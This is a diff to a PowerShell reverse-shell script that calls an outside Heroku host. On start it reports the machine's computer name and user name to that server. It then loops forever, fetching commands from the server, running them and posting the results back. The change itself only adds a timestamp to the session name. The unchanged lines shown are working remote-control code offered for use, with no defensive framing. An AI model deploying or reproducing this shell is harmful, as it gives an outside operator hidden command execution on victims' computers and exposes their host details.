@@ -2,10 +2,11 @@
 # License http://opensource.org/licenses/mit-license.php MIT License
 
 $__url = "https://reverse80.herokuapp.com/"
+$__shell_name = $env:computername + "  " + (Get-Date -Format g)
 
 try
 {
-	$__params = @{name = $env:computername}
+	$__params = @{name = $__shell_name}
 	$__dumb = Invoke-WebRequest -UseBasicParsing -Uri ($__url + "init") -Body $__params
 }
 catch
@@ -13,7 +14,7 @@ catch
 	exit
 }
 
-$__params = @{name = $env:computername; output = "Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nPS " + (pwd).Path + "> "}
+$__params = @{name = $__shell_name; output = "Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nPS " + (pwd).Path + "> "}
 $__dumb = Invoke-WebRequest -UseBasicParsing -Uri ($__url + "result") -Method POST -Body $__params
 
 while (1 -eq 1)
@@ -22,7 +23,7 @@ while (1 -eq 1)
 	
 	try
 	{
-		$__params = @{name = $env:computername}
+		$__params = @{name = $__shell_name}
 		$__cmd = (Invoke-WebRequest -UseBasicParsing -Uri ($__url + "cmd") -Body $__params).Content
 	}
 	catch
@@ -56,6 +57,6 @@ while (1 -eq 1)
 
 	$__output = $__result + $__err
 	
-	$__params = @{name = $env:computername; output = $__output + "`nPS " + (pwd).Path + "> "}
+	$__params = @{name = $__shell_name; output = $__output + "`nPS " + (pwd).Path + "> "}
 	$__dumb = Invoke-WebRequest -UseBasicParsing -Uri ($__url + "result") -Method POST -Body $__params
 }
